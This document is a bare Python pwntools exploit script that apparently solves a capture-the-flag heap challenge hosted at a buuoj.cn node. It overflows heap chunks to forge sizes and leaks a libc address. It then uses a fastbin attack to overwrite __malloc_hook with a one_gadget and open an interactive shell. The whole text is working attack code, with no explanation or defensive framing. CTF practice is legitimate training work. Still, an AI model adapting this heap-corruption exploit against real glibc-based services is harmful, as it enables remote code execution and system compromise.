from pwn import *

io=remote('node3.buuoj.cn',27627)
libc=ELF('./libc-2.23.so')

def add(size):
    io.recvuntil('Command: ')
    io.sendline('1')
    io.recvuntil('Size: ')
    io.sendline(str(size))

def edit(idx,size,data):
    io.recvuntil('Command: ')
    io.sendline('2')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.sendline(data)

def free(idx):
    io.recvuntil('Command: ')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('Command: ')
    io.sendline('4')
    io.recvuntil('Index: ')
    io.sendline(str(idx))

add(0x100)#0
add(0x100)#1
add(0x80)#2
add(0x60)#3
add(0x60)#4
add(0x60)#5

edit(0,0x110,'a'*0x108+p64(0x1a1))
free(1)
add(0x190)#1
edit(1,0x110,'a'*0x108+p64(0x91))
free(2)
show(1)
io.recvuntil('Content: ')
io.recv(0x111)
libc_base=u64(io.recv(8))-0x3c4b78
print(hex(libc_base))

malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0x4526a
free(4)
edit(3,0x78,'a'*0x68+p64(0x71)+p64(malloc_hook-0x23))
add(0x60)#2
add(0x60)#4
pl='a'*0x13+p64(one_gadget)
edit(4,len(pl),pl)

#getshell
add(0x10)

io.interactive()